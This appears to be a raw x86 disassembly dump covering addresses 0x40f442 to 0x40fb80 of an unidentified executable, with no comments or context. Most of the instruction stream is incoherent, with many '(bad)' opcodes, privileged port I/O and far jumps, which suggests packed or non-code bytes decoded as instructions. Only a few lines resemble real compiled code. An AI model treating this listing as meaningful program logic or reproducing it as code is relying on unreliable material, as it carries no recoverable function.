  40f442:	push   ebx
  40f444:	sbb    eax,0x376ac3a3
  40f449:	push   esi
  40f44a:	sbb    al,0x1d
  40f44c:	(bad)  
  40f44d:	and    BYTE PTR [ebp+0x32],dh
  40f450:	pop    ecx
  40f451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f452:	sbb    bl,bl
  40f454:	and    ah,BYTE PTR [eax+edi*4+0xe717c47]
  40f45b:	pop    es
  40f45c:	popf   
  40f45d:	aas    
  40f45e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f45f:	fistp  DWORD PTR [edx-0x13]
  40f462:	clc    
  40f463:	jae    0x40f413
  40f465:	push   edx
  40f466:	pusha  
  40f467:	leave  
  40f468:	xchg   DWORD PTR [edi+0x51],edx
  40f46b:	clc    
  40f46c:	sub    BYTE PTR [edi],dh
  40f46e:	mov    ds:0x5b7589c1,eax
  40f473:	inc    edx
  40f474:	loopne 0x40f412
  40f476:	icebp  
  40f477:	or     ecx,DWORD PTR [ebx+0x5fc1bb4f]
  40f47d:	or     BYTE PTR ss:[eax-0x68374256],ch
  40f484:	cld    
  40f485:	js     0x40f43b
  40f487:	push   ss
  40f488:	repz xchg ecx,eax
  40f48a:	outs   dx,BYTE PTR ds:[esi]
  40f48b:	shl    BYTE PTR [ecx+esi*8],1
  40f48e:	dec    ebp
  40f48f:	xchg   BYTE PTR [eax],ch
  40f491:	jle    0x40f434
  40f493:	inc    esi
  40f494:	and    al,0x40
  40f496:	jmp    0x40f48d
  40f498:	popa   
  40f499:	outs   dx,BYTE PTR ds:[esi]
  40f49a:	cmp    esp,esi
  40f49c:	or     ebp,DWORD PTR [eax]
  40f49e:	and    eax,0xda7453ac
  40f4a3:	std    
  40f4a4:	xor    ecx,DWORD PTR [edi-0x5c]
  40f4a7:	and    ebp,DWORD PTR [ecx-0x3b815f98]
  40f4ad:	xchg   esp,eax
  40f4ae:	sbb    eax,0xbe6e6b17
  40f4b3:	dec    ecx
  40f4b4:	mov    cl,BYTE PTR [esi-0x1ecf11d0]
  40f4ba:	xchg   esi,eax
  40f4bb:	pop    eax
  40f4bc:	int    0xe7
  40f4be:	stos   BYTE PTR es:[edi],al
  40f4bf:	mul    BYTE PTR [ebx+0xd]
  40f4c2:	loopne 0x40f475
  40f4c4:	push   ss
  40f4c5:	popa   
  40f4c6:	pop    edi
  40f4c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4c8:	pop    esp
  40f4c9:	and    eax,0xec5b2ace
  40f4ce:	jge    0x40f523
  40f4d0:	daa    
  40f4d1:	lods   al,BYTE PTR ds:[esi]
  40f4d2:	pusha  
  40f4d3:	aas    
  40f4d4:	stc    
  40f4d5:	bound  edx,QWORD PTR [edi]
  40f4d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4d8:	jbe    0x40f48a
  40f4da:	mov    esi,0xf830d274
  40f4df:	cmp    BYTE PTR [edx-0x3248728a],0xeb
  40f4e6:	inc    ecx
  40f4e7:	aas    
  40f4e8:	fistp  WORD PTR [edi-0x11fad28]
  40f4ee:	pop    ds
  40f4ef:	mov    bh,0x35
  40f4f1:	sahf   
  40f4f2:	in     eax,dx
  40f4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4f4:	rcr    DWORD PTR [edi+ecx*4+0x20],1
  40f4f8:	call   0x571c:0x52852ff7
  40f4ff:	call   0xa4d2:0x20c17c73
  40f506:	pushf  
  40f507:	pop    ebp
  40f508:	retf   
  40f509:	or     eax,0xf633f873
  40f50e:	mov    DWORD PTR [ebp-0x14],ecx
  40f511:	mov    eax,DWORD PTR [ebp-0x28]
  40f514:	jmp    0x40f908
  40f519:	sbb    al,0x75
  40f51b:	sar    DWORD PTR [esi+0x71b35a51],1
  40f521:	lahf   
  40f522:	popa   
  40f523:	sti    
  40f524:	arpl   WORD PTR [esi-0x7e],cx
  40f527:	dec    edi
  40f528:	xchg   ebx,eax
  40f529:	mov    dh,0xaf
  40f52b:	jo     0x40f59d
  40f52d:	dec    ecx
  40f52e:	jge    0x40f5a0
  40f530:	jo     0x40f4c7
  40f532:	out    0x41,eax
  40f534:	test   eax,0xe15b8844
  40f539:	jle    0x40f573
  40f53b:	ins    BYTE PTR es:[edi],dx
  40f53c:	lock pop eax
  40f53e:	data16 sbb BYTE PTR [di],bl
  40f542:	sbb    eax,0x881d46f8
  40f547:	inc    esp
  40f548:	fwait
  40f549:	test   BYTE PTR [edi*8+0x4b53dc30],0x9
  40f551:	xor    DWORD PTR [edx+ebx*2-0x12],eax
  40f555:	ins    DWORD PTR es:[edi],dx
  40f556:	std    
  40f557:	in     al,0x32
  40f559:	dec    ebp
  40f55a:	xchg   esi,eax
  40f55b:	nop
  40f55c:	ds mov esp,0x86aae2a
  40f562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f563:	in     al,dx
  40f564:	mov    eax,ds:0xcd450513
  40f569:	rcl    BYTE PTR [edx+ecx*8],0xba
  40f56d:	add    eax,DWORD PTR [eax-0x67cd91c1]
  40f573:	icebp  
  40f574:	retf   0xff57
  40f577:	test   DWORD PTR [ecx],esi
  40f579:	int    0xe5
  40f57b:	cli    
  40f57c:	and    dl,dl
  40f57e:	test   BYTE PTR [edi-0x4f],al
  40f581:	add    ch,BYTE PTR [edx+0x6b3730ed]
  40f587:	fwait
  40f588:	adc    al,0x9f
  40f58a:	mov    ebx,0x12d156b2
  40f58f:	in     eax,0xf7
  40f591:	pop    ecx
  40f592:	jl     0x40f5b4
  40f594:	test   al,0x0
  40f596:	in     eax,dx
  40f597:	jmp    DWORD PTR [edx-0x1c]
  40f59a:	jno    0x40f52e
  40f59c:	enter  0x3bd7,0x9e
  40f5a0:	xchg   ecx,eax
  40f5a1:	int3   
  40f5a2:	sahf   
  40f5a3:	pop    edx
  40f5a4:	lds    ebp,FWORD PTR [eax]
  40f5a6:	mov    ?,WORD PTR [edi]
  40f5a8:	push   edx
  40f5a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5aa:	arpl   WORD PTR [ebp-0x25],si
  40f5ad:	push   edi
  40f5ae:	fld    DWORD PTR [eax+0x155c9d6d]
  40f5b4:	push   ecx
  40f5b5:	retf   
  40f5b6:	lea    ebx,[ebp-0x54]
  40f5b9:	ja     0x40f636
  40f5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5bc:	outs   dx,DWORD PTR ds:[esi]
  40f5bd:	add    dh,BYTE PTR [eax-0x4abf19ab]
  40f5c3:	jne    0x40f58f
  40f5c5:	cs xchg edi,eax
  40f5c7:	out    dx,al
  40f5c8:	jo     0x40f55b
  40f5ca:	fcomp  DWORD PTR [ecx+0x38eb362a]
  40f5d0:	hlt    
  40f5d1:	mov    ecx,0x3785b9fe
  40f5d6:	and    ch,bh
  40f5d8:	push   edx
  40f5d9:	mov    bh,0x62
  40f5db:	pop    esp
  40f5dc:	jae    0x40f577
  40f5de:	sbb    eax,0xb851dc8c
  40f5e3:	aas    
  40f5e4:	call   FWORD PTR [ebp+0x77be6f3e]
  40f5ea:	fiadd  WORD PTR [edx-0x69]
  40f5ed:	sbb    BYTE PTR [ebp-0x12182792],al
  40f5f3:	mov    eax,0x70033803
  40f5f8:	push   ds
  40f5f9:	sbb    bh,BYTE PTR [ebx+0x2317af24]
  40f5ff:	imul   eax,DWORD PTR ds:0x442f30e9,0x5
  40f606:	fdivr  st(0),st
  40f608:	add    DWORD PTR [eax+0x7e],ebx
  40f60b:	jmp    0x47f32e98
  40f610:	jmp    0x40f5e1
  40f612:	popa   
  40f613:	shr    DWORD PTR [edi-0x105092f8],1
  40f619:	xor    eax,0x2a6870b5
  40f61e:	push   eax
  40f61f:	jne    0x40f62a
  40f621:	mov    ch,0x41
  40f623:	outs   dx,BYTE PTR ds:[esi]
  40f624:	xor    eax,DWORD PTR [ebx-0x4c7a0bfe]
  40f62a:	ins    DWORD PTR es:[edi],dx
  40f62b:	dec    ebp
  40f62c:	or     DWORD PTR [ecx-0x56],0xc73e62a0
  40f633:	mov    DWORD PTR [eax+0x7b],edi
  40f636:	pop    ebx
  40f637:	add    DWORD PTR [edx],ebp
  40f639:	test   esi,ebx
  40f63b:	xchg   ebp,eax
  40f63c:	inc    edi
  40f63d:	(bad)
  40f642:	scas   al,BYTE PTR es:[edi]
  40f643:	jnp    0x40f6bf
  40f645:	push   ds
  40f646:	or     ah,BYTE PTR [ecx+0x1aecf42c]
  40f64c:	xchg   ebx,eax
  40f64d:	lods   al,BYTE PTR ds:[esi]
  40f64e:	nop
  40f64f:	jp     0x40f614
  40f651:	or     BYTE PTR [ebp-0x75878fc4],dl
  40f657:	lea    eax,[edx]
  40f659:	mov    dh,0x24
  40f65b:	jg     0x40f68c
  40f65d:	push   es
  40f65e:	cmp    edi,ebp
  40f660:	xchg   edi,eax
  40f661:	mov    DWORD PTR [edi-0x9],0xf57e3132
  40f668:	jl     0x40f639
  40f66a:	sar    BYTE PTR [ebp+0x31],1
  40f66d:	loopne 0x40f6c1
  40f66f:	imul   ebp,DWORD PTR [ecx-0x2],0x1a4c0818
  40f676:	cli    
  40f677:	mov    BYTE PTR [ebp+0x72],bl
  40f67a:	and    ebp,DWORD PTR [esi]
  40f67c:	mov    edi,DWORD PTR [edi+0x567cb46a]
  40f682:	inc    esi
  40f683:	mov    bl,0x4f
  40f685:	pushf  
  40f686:	jae    0x40f6bf
  40f688:	rcl    BYTE PTR [esi+0x45],cl
  40f68b:	out    dx,eax
  40f68c:	nop    esi
  40f68f:	out    dx,eax
  40f690:	mov    esp,0xfe13c415
  40f695:	(bad)  
  40f696:	loopne 0x40f681
  40f698:	out    0xe8,eax
  40f69a:	dec    ecx
  40f69b:	mov    edi,0x31fd5329
  40f6a0:	ret    0xee6b
  40f6a3:	mov    eax,0x5d4f2001
  40f6a8:	add    al,0x6f
  40f6aa:	icebp  
  40f6ab:	or     eax,0xa9f386d8
  40f6b0:	jae    0x40f6b9
  40f6b2:	loop   0x40f67f
  40f6b4:	push   esp
  40f6b5:	mov    WORD PTR [edx+edx*1-0x23c9ffdb],gs
  40f6bc:	in     eax,0x3
  40f6be:	push   0x18
  40f6c0:	ins    BYTE PTR es:[edi],dx
  40f6c1:	cmp    al,0x4a
  40f6c3:	fisubr DWORD PTR [edi+ebx*4+0x68]
  40f6c7:	sub    al,al
  40f6c9:	in     al,0xb2
  40f6cb:	(bad)  
  40f6cc:	scas   eax,DWORD PTR es:[edi]
  40f6cd:	ins    DWORD PTR es:[edi],dx
  40f6ce:	je     0x40f677
  40f6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6d1:	stos   DWORD PTR es:[di],eax
  40f6d3:	pop    es
  40f6d4:	popf   
  40f6d5:	and    eax,0xebb28ec9
  40f6da:	mov    cl,ah
  40f6dc:	loop   0x40f712
  40f6de:	jbe    0x40f728
  40f6e0:	aaa    
  40f6e1:	sub    BYTE PTR [ecx],cl
  40f6e3:	sbb    DWORD PTR [ebp-0x5b],ecx
  40f6e6:	mov    WORD PTR [eax-0x438abc1a],gs
  40f6ec:	mov    al,0xbd
  40f6ee:	lods   al,BYTE PTR ds:[esi]
  40f6ef:	mov    bl,BYTE PTR [ecx+0x64]
  40f6f2:	jl     0x40f702
  40f6f4:	in     al,dx
  40f6f5:	xor    al,0xef
  40f6f7:	test   DWORD PTR [edx-0x25],eax
  40f6fa:	aaa    
  40f6fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6fc:	frstor [eax-0x3d]
  40f6ff:	dec    esp
  40f700:	aas    
  40f701:	scas   al,BYTE PTR es:[edi]
  40f702:	(bad)  
  40f703:	jmp    0xa138:0xb11fee75
  40f70a:	or     DWORD PTR [ebp-0x25e7416],0xffffffa8
  40f711:	mov    dl,0xbd
  40f713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f714:	xchg   ah,bh
  40f716:	loopne 0x40f75e
  40f718:	xchg   edx,eax
  40f719:	push   edi
  40f71a:	xor    ch,BYTE PTR [ebp-0x69]
  40f71d:	mov    ds:0x2ace3051,eax
  40f722:	and    al,0x55
  40f724:	addr16 (bad) 
  40f726:	adc    eax,0xf1d0def3
  40f72b:	(bad)  
  40f72c:	aas    
  40f72d:	cmp    al,0xdc
  40f72f:	jb     0x40f6c8
  40f731:	stos   BYTE PTR es:[edi],al
  40f732:	add    DWORD PTR [edi+ebp*2-0x7c44803a],esi
  40f739:	add    DWORD PTR [esp-0x6f57f0ed],esp
  40f740:	jae    0x40f7a0
  40f742:	mov    ds,WORD PTR [ecx]
  40f744:	sub    BYTE PTR [ebp-0x6d],cl
  40f747:	lods   eax,DWORD PTR ds:[esi]
  40f748:	push   eax
  40f749:	pop    eax
  40f74a:	mov    eax,ds:0x5d3713d0
  40f74f:	xchg   esi,eax
  40f750:	in     eax,0xf1
  40f752:	mov    esp,ecx
  40f754:	jl     0x40f73f
  40f756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f757:	lock adc edi,eax
  40f75a:	vpsubw xmm1,xmm2,XMMWORD PTR [esi-0x79]
  40f75f:	or     al,0x4d
  40f761:	mov    ebx,0xa8f815aa
  40f766:	fist   DWORD PTR [edi+0x375d2f1]
  40f76c:	inc    eax
  40f76d:	jns    0x40f7b3
  40f76f:	xor    cl,bh
  40f771:	mov    ah,0xc8
  40f773:	stos   BYTE PTR es:[edi],al
  40f774:	mov    dh,0xb4
  40f776:	ret    0x5b3b
  40f779:	xor    dl,BYTE PTR ds:0xbe9283fd
  40f77f:	sub    al,0x61
  40f781:	ror    BYTE PTR [esi-0x34ca50b3],1
  40f787:	or     ecx,edx
  40f789:	xor    al,0xa5
  40f78b:	xor    DWORD PTR [ebx+0x29],edx
  40f78e:	push   ebp
  40f78f:	fs mov ebx,esp
  40f792:	lea    edi,[ebp+0x52]
  40f795:	and    al,0x4f
  40f797:	rcr    DWORD PTR [esi+0x3e],0xca
  40f79b:	repnz push ecx
  40f79d:	mov    ecx,0xa38453f
  40f7a2:	push   edx
  40f7a3:	lock fnsave [edi+ecx*1]
  40f7a7:	popa   
  40f7a8:	or     DWORD PTR [ebx+0x6ed9c360],esi
  40f7ae:	mov    WORD PTR [ecx],?
  40f7b0:	gs mov esi,ds
  40f7b3:	jnp    0x40f768
  40f7b5:	jne    0x40f807
  40f7b7:	inc    BYTE PTR [edx]
  40f7b9:	xchg   ecx,eax
  40f7ba:	push   ebx
  40f7bb:	adc    bl,BYTE PTR [edi-0x74]
  40f7be:	test   eax,0xa933f064
  40f7c3:	popf   
  40f7c4:	xchg   DWORD PTR ds:0xbac075e4,ebx
  40f7ca:	into   
  40f7cb:	pop    esi
  40f7cc:	or     ebx,DWORD PTR [esi+0x55927b25]
  40f7d2:	xchg   dh,cl
  40f7d4:	in     al,dx
  40f7d5:	or     DWORD PTR [eax+0x5c0ea535],esi
  40f7db:	ins    DWORD PTR es:[edi],dx
  40f7dc:	mov    al,0x7c
  40f7de:	adc    ch,BYTE PTR [eax+0x502d710]
  40f7e4:	(bad)  
  40f7e5:	std    
  40f7e6:	or     esi,ebp
  40f7e8:	inc    ebx
  40f7e9:	fiadd  DWORD PTR [ebp+0x4d]
  40f7ec:	xor    eax,0x3d9f3e36
  40f7f1:	adc    bh,ah
  40f7f3:	or     al,0xce
  40f7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7f6:	sbb    al,0x2f
  40f7f8:	cld    
  40f7f9:	jle    0x40f845
  40f7fb:	add    al,0xbc
  40f7fd:	inc    ecx
  40f7fe:	std    
  40f7ff:	fwait
  40f800:	shl    DWORD PTR [edi+0x4b],cl
  40f803:	mov    ds:0x7be9502b,al
  40f808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f809:	push   esi
  40f80a:	test   al,0xf
  40f80c:	imul   ebp,DWORD PTR [edx-0x64a46ff5],0xc0eae9ac
  40f816:	lods   al,BYTE PTR ds:[esi]
  40f817:	bound  ebp,QWORD PTR [esi-0x43]
  40f81a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f81b:	mov    edx,0x4a06acce
  40f820:	fisubr DWORD PTR [eax-0x6f]
  40f823:	arpl   WORD PTR [ebx],cx
  40f825:	call   0x7aa33517
  40f82a:	jg     0x40f845
  40f82c:	mov    edx,0x809746ab
  40f831:	mov    al,0x2d
  40f833:	push   ecx
  40f834:	mov    eax,ds:0x7c290a79
  40f839:	(bad)  
  40f83a:	cmp    cl,bh
  40f83c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f83d:	mov    edi,0xd3ac728b
  40f842:	ja     0x40f884
  40f844:	fmul   DWORD PTR [ecx-0x1e90b3b6]
  40f84a:	mov    dh,0x5c
  40f84c:	and    DWORD PTR [edi],edx
  40f84e:	fistp  QWORD PTR [eax+0x781333f4]
  40f854:	and    eax,0x812b0238
  40f859:	xchg   ecx,eax
  40f85a:	aad    0xd4
  40f85c:	dec    esp
  40f85d:	xchg   ebx,eax
  40f85e:	fcmovu st,st(7)
  40f860:	adc    ch,BYTE PTR [eax+0x19]
  40f863:	inc    ebx
  40f864:	je     0x40f87d
  40f866:	mov    bh,0x68
  40f868:	sbb    DWORD PTR [eax],edi
  40f86a:	push   ecx
  40f86b:	std    
  40f86c:	mov    esi,0xc67c790e
  40f871:	inc    ecx
  40f872:	(bad)  
  40f873:	(bad)  
  40f874:	(bad)  
  40f875:	stc    
  40f876:	add    DWORD PTR [ecx],esp
  40f878:	imul   ebx,DWORD PTR [eax-0x3a],0x115df1cc
  40f87f:	sbb    DWORD PTR [ecx],esp
  40f881:	and    eax,0x9715c30f
  40f886:	adc    al,0xd6
  40f888:	sahf   
  40f889:	rcr    dl,1
  40f88b:	adc    eax,0xdd609f05
  40f890:	pop    ebp
  40f891:	in     eax,0xf0
  40f893:	xchg   ebx,eax
  40f894:	fisubr WORD PTR [edi]
  40f896:	shl    BYTE PTR ds:0xd581c00a,0x6c
  40f89d:	in     al,0x73
  40f89f:	dec    eax
  40f8a0:	push   ds
  40f8a1:	jp     0x40f8bc
  40f8a3:	adc    DWORD PTR [eax],0x20
  40f8a6:	pop    esp
  40f8a7:	xor    BYTE PTR [edi],cl
  40f8a9:	and    BYTE PTR [esi],0x7a
  40f8ac:	(bad)  
  40f8ad:	(bad)  
  40f8ae:	fdivr  st(0),st
  40f8b0:	jns    0x40f8d7
  40f8b2:	stos   DWORD PTR es:[edi],eax
  40f8b3:	mov    BYTE PTR [ebx+0x12],bl
  40f8b6:	mov    cl,0xe4
  40f8b8:	pop    edi
  40f8b9:	mov    eax,0xfc840d9a
  40f8be:	sahf   
  40f8bf:	aad    0x81
  40f8c1:	ror    WORD PTR [ecx-0x50a57843],0xee
  40f8c9:	mov    WORD PTR [eax+0xf],es
  40f8cc:	sbb    ah,BYTE PTR [esi]
  40f8ce:	mov    al,0x2
  40f8d0:	sahf   
  40f8d1:	imul   ebx,DWORD PTR [edi-0x12],0xd57118c8
  40f8d8:	ret    0xfe73
  40f8db:	jns    0x40f944
  40f8dd:	and    al,0xfd
  40f8df:	sub    eax,edx
  40f8e1:	mov    eax,ds:0xd99d2736
  40f8e6:	ret    0xe83d
  40f8e9:	push   eax
  40f8ea:	mov    bl,0xc5
  40f8ec:	inc    eax
  40f8ed:	dec    ebp
  40f8ee:	loop   0x40f918
  40f8f0:	nop
  40f8f1:	std    
  40f8f2:	test   al,0x4d
  40f8f4:	sbb    esi,esp
  40f8f6:	mov    BYTE PTR es:[eax],dl
  40f8f9:	adc    eax,0x880fbd1f
  40f8fe:	xchg   ecx,eax
  40f8ff:	iretw  
  40f901:	test   al,0x5d
  40f903:	mov    bh,0xde
  40f905:	jg     0x40f8b0
  40f907:	or     cl,BYTE PTR [ebx+0xc03084d]
  40f90d:	mov    eax,0x89f8458d
  40f912:	dec    ebp
  40f913:	rcl    BYTE PTR [eax-0x1],1
  40f916:	jne    0x40f8e8
  40f918:	push   DWORD PTR [ebp+0xc]
  40f91b:	call   0x403925
  40f920:	mov    eax,DWORD PTR [ebp-0x4]
  40f923:	mov    ecx,DWORD PTR [ebp-0x8]
  40f926:	jmp    0x40fd1a
  40f92b:	or     DWORD PTR ds:[edi],eax
  40f92e:	(bad)  
  40f92f:	rcl    edx,cl
  40f931:	cmp    DWORD PTR [ecx],edx
  40f933:	pop    ecx
  40f934:	jns    0x40f901
  40f936:	popa   
  40f937:	mov    bl,0x8d
  40f939:	mov    bl,0x78
  40f93b:	(bad)  
  40f93c:	stos   DWORD PTR es:[edi],eax
  40f93d:	jo     0x40f9af
  40f93f:	dec    ecx
  40f940:	jge    0x40f9b2
  40f942:	jo     0x40f918
  40f944:	or     al,bh
  40f946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f947:	repnz pop ebp
  40f949:	jmp    0x2b4d:0xc3dbadaf
  40f950:	mov    ds:0x4224b89c,eax
  40f955:	test   BYTE PTR [edx+0x9],0x3f
  40f959:	lods   eax,DWORD PTR ds:[esi]
  40f95a:	xchg   edx,eax
  40f95b:	push   cs
  40f95c:	inc    ecx
  40f95d:	fimul  WORD PTR [esi+0x79c94ec]
  40f963:	or     BYTE PTR [eax],cl
  40f965:	int    0x94
  40f967:	sub    BYTE PTR [ebx],al
  40f969:	std    
  40f96a:	fiadd  DWORD PTR [edx+0xb0e22d7]
  40f970:	pop    ebp
  40f971:	mov    esi,edx
  40f973:	in     al,dx
  40f974:	pop    es
  40f975:	scas   eax,DWORD PTR es:[edi]
  40f976:	out    dx,eax
  40f977:	add    al,0xdf
  40f979:	aas    
  40f97a:	fldcw  WORD PTR [ebp-0x3b]
  40f97d:	push   edx
  40f97e:	inc    edx
  40f97f:	ret    0xf5ed
  40f982:	jg     0x40f997
  40f984:	jmp    0xfc3faa73
  40f989:	pop    ss
  40f98a:	inc    ecx
  40f98b:	retf   
  40f98c:	enter  0x8df9,0x59
  40f990:	jae    0x40f975
  40f992:	ret    0x15c8
  40f995:	or     DWORD PTR [ebp+0x3bb55416],esi
  40f99b:	xchg   DWORD PTR [ebp-0x4742099d],eax
  40f9a1:	repnz sub eax,0xd4bb5a70
  40f9a7:	inc    ecx
  40f9a8:	outs   dx,DWORD PTR ds:[esi]
  40f9a9:	scas   eax,DWORD PTR es:[edi]
  40f9aa:	pop    ds
  40f9ab:	mov    gs,WORD PTR [ecx+0x0]
  40f9ae:	(bad)  
  40f9af:	loopne 0x40fa0f
  40f9b1:	shr    bl,1
  40f9b3:	and    edi,ecx
  40f9b5:	mov    ah,0x3b
  40f9b7:	iret   
  40f9b8:	iret   
  40f9b9:	test   DWORD PTR ds:0x9def95a8,ebx
  40f9bf:	mov    cl,0xfe
  40f9c1:	jae    0x40fa1e
  40f9c3:	jp     0x40f9ff
  40f9c5:	pop    esi
  40f9c6:	retf   0x7f7d
  40f9c9:	or     BYTE PTR [ebp-0x610ecca1],bh
  40f9cf:	ins    BYTE PTR es:[edi],dx
  40f9d0:	and    BYTE PTR [esi],0xee
  40f9d3:	cwde   
  40f9d4:	and    al,0xe6
  40f9d6:	mov    ds:0xdeb4543a,eax
  40f9db:	stos   DWORD PTR es:[edi],eax
  40f9dc:	mov    esp,?
  40f9de:	imul   esi,DWORD PTR [ebx-0x44bde200],0xffffffaf
  40f9e5:	push   es
  40f9e6:	pushf  
  40f9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9e8:	xchg   DWORD PTR [edi],ecx
  40f9ea:	adc    DWORD PTR [ebp-0x1940e1e7],ecx
  40f9f0:	push   ds
  40f9f1:	dec    ebx
  40f9f2:	aaa    
  40f9f3:	sub    esp,edx
  40f9f5:	adc    BYTE PTR [esp+edi*8-0x7e3a27e5],cl
  40f9fc:	aaa    
  40f9fd:	outs   dx,BYTE PTR ds:[esi]
  40f9fe:	xchg   esp,eax
  40f9ff:	int3   
  40fa00:	xor    DWORD PTR [ecx-0x1b374067],eax
  40fa06:	outs   dx,DWORD PTR ds:[esi]
  40fa07:	mov    ebx,DWORD PTR [esp+eax*2+0x423b7c78]
  40fa0e:	fsqrt  
  40fa10:	cmp    al,0xa0
  40fa12:	mov    dh,0x8d
  40fa14:	mov    esp,0x1e2e07fa
  40fa19:	cli    
  40fa1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa1b:	jl     0x40f9d8
  40fa1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa1e:	mov    esi,0x1dec3e08
  40fa23:	pop    edx
  40fa24:	pop    ds
  40fa25:	mov    ch,0x7d
  40fa27:	and    BYTE PTR [eax+eax*8+0xf],0x2a
  40fa2c:	imul   ecx,DWORD PTR [ebp-0x1f42f986],0xffffffd6
  40fa33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa34:	std    
  40fa35:	and    esi,DWORD PTR [ecx-0x31a3344b]
  40fa3b:	dec    ecx
  40fa3c:	das    
  40fa3d:	and    BYTE PTR [edi+eiz*4-0x56],dl
  40fa41:	mov    ebx,0xc035a470
  40fa46:	clc    
  40fa47:	std    
  40fa48:	mov    esi,0x37f02677
  40fa4d:	pop    esp
  40fa4e:	(bad)
  40fa52:	inc    ebx
  40fa53:	push   ebp
  40fa54:	add    bh,BYTE PTR [ecx]
  40fa56:	mov    al,0xd5
  40fa58:	sub    DWORD PTR [eax-0x1b],eax
  40fa5b:	xor    DWORD PTR [edx],edx
  40fa5d:	jb     0x40fa14
  40fa5f:	pop    eax
  40fa60:	pop    ebx
  40fa61:	cwde   
  40fa62:	cmp    eax,0x4b3bae7f
  40fa67:	gs pop edi
  40fa69:	mov    edi,0x2dce7a1d
  40fa6e:	imul   ebx,edx,0x76
  40fa71:	or     BYTE PTR [esi-0x63],al
  40fa74:	leave  
  40fa75:	or     eax,0xf01f1eb6
  40fa7a:	repz dec ebx
  40fa7c:	mov    ebx,0x6e7399d3
  40fa81:	sar    DWORD PTR [edi-0x6e202e53],cl
  40fa87:	cmp    al,0xe0
  40fa89:	das    
  40fa8a:	mov    ebx,0xe052a5c2
  40fa8f:	mov    dh,0x9e
  40fa91:	in     eax,dx
  40fa92:	add    al,0xe9
  40fa94:	out    dx,al
  40fa95:	pop    ebp
  40fa96:	sbb    esp,esp
  40fa98:	ror    BYTE PTR [edi],0x81
  40fa9b:	mov    esp,0xff1af66e
  40faa0:	enter  0xda15,0x28
  40faa4:	and    eax,0xe2a2dee5
  40faa9:	out    dx,al
  40faaa:	stos   DWORD PTR es:[edi],eax
  40faab:	inc    esp
  40faac:	mov    bl,0x28
  40faae:	mov    bl,0x62
  40fab0:	sub    eax,0x6f3bb026
  40fab5:	repz mov ah,0xa7
  40fab8:	(bad)  
  40fab9:	retf   
  40faba:	(bad)  cs:[edi+0x0]
  40fabe:	sub    al,al
  40fac0:	jg     0x40faf3
  40fac2:	or     eax,esi
  40fac4:	shr    DWORD PTR [esi],0x1b
  40fac7:	push   ebx
  40fac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fac9:	test   dl,al
  40facb:	mov    ds:0x6d97344a,al
  40fad0:	cli    
  40fad1:	mov    ds:0xeeb100eb,eax
  40fad6:	je     0x40fb27
  40fad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad9:	fiadd  WORD PTR [ecx-0x3c]
  40fadc:	ss pop es
  40fade:	push   cs
  40fadf:	mov    eax,ds:0x751fdbf
  40fae4:	mov    al,ds:0x86c85e7a
  40fae9:	mov    eax,ds:0x248e8229
  40faee:	aam    0xc6
  40faf0:	jns    0x40fb25
  40faf2:	mov    bh,0x1a
  40faf4:	adc    DWORD PTR [esi+0x44320658],0x1
  40fafb:	adc    BYTE PTR [esi-0x5d],cl
  40fafe:	sbb    al,0x49
  40fb00:	popa   
  40fb01:	neg    DWORD PTR [ebp+0x2b77ba0a]
  40fb07:	(bad)  
  40fb08:	pop    edi
  40fb09:	call   0xc1df6751
  40fb0e:	arpl   WORD PTR [edx-0x70f0e991],ax
  40fb14:	fwait
  40fb15:	int    0x4a
  40fb17:	in     al,dx
  40fb18:	aam    0x6
  40fb1a:	mov    edx,DWORD PTR [ecx]
  40fb1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb1d:	pop    esp
  40fb1e:	and    eax,0xbb0c99de
  40fb23:	dec    BYTE PTR [esi]
  40fb25:	mov    al,ds:0x680191de
  40fb2a:	pop    ds
  40fb2b:	or     DWORD PTR [ecx],ecx
  40fb2d:	inc    esi
  40fb2e:	mov    ds:0x22637355,eax
  40fb33:	repz sbb al,0xc3
  40fb36:	in     eax,0xa5
  40fb38:	push   edi
  40fb39:	inc    ebp
  40fb3a:	nop
  40fb3b:	xor    al,0x59
  40fb3d:	test   DWORD PTR [edi+0x5041d836],eax
  40fb43:	inc    esp
  40fb44:	cmc    
  40fb45:	xor    BYTE PTR ds:0xdd7c8ae1,0x1e
  40fb4c:	mov    ?,WORD PTR [esi+0x67]
  40fb4f:	loope  0x40fb06
  40fb51:	daa    
  40fb52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb53:	push   ebp
  40fb54:	pushf  
  40fb55:	test   BYTE PTR [ebp+0x59],dh
  40fb58:	imul   esi,ecx,0xb77f5bc8
  40fb5e:	test   DWORD PTR [edx+0x1a3ea3ff],0x2fc4f21b
  40fb68:	arpl   WORD PTR [ecx],ax
  40fb6a:	mov    esp,0x50041be7
  40fb6f:	mov    WORD PTR [ebx-0x634e2f8a],?
  40fb75:	mov    ebp,0xa1f39b2d
  40fb7a:	jmp    0x40fb59
  40fb7c:	popf   
  40fb7d:	test   bh,bh
  40fb7f:	(bad)  
  40fb80:	mov    edx,edi
